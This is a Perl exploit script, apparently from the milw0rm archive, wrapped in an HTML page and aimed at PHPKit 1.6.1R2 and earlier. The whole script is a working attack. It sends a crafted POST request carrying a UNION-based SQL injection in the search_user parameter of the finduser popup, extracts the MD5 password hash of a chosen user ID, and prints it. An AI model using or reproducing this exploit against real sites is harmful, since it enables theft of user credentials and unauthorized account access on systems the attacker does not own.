<html><head><title>PHPKIT <= 1.6.1R2 (search_user) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use IO::Socket;

print q{
-----------------------------------------------
PHPKit 1.6.1 exploit by x23 ~ phcn.ws ~ geek-network.de
use: phpkit161.pl [server] [dir] [vic_id]
sample:
$ perl phpkit161.pl localhost /phpkit/ 1
-----------------------------------------------

};

$webpage =   $ARGV[0];
$directory = $ARGV[1];
$vic_id =    $ARGV[2];

if (!$vic_id) { die &quot;~ read how to use ;)\n&quot;; }

print &quot;~ connecting\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$webpage&quot;, PeerPort=&gt;&quot;80&quot;) || die &quot;[+] Can't connect to Server\n&quot;;

print &quot;~ exploiting\n&quot;;
print $sock &quot;POST &quot;.$directory.&quot;popup.php?path=misc/finduser.php HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $webpage\r\n&quot;;
print $sock &quot;Keep-Alive: 300\r\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
print $sock &quot;Content-Length: &quot;.length(&quot;search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D&quot;.$vic_id.&quot;%2F*&amp;action=Suche&amp;User=-1&quot;).&quot;\r\n\r\n&quot;;

print $sock &quot;search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D&quot;.$vic_id.&quot;%2F*&amp;action=Suche&amp;User=-1&quot;;

while ($answer = &lt;$sock&gt;) {
  #print $answer;
  if ($answer =~/&lt;option value=&quot;([0-9a-f]{32})&quot;&gt;/) {
     print &quot;~ hash: $1\n&quot;;
     close($sock);
     exit();
     break;
  }
}

close($sock);

# milw0rm.com [2006-11-04]</pre></html>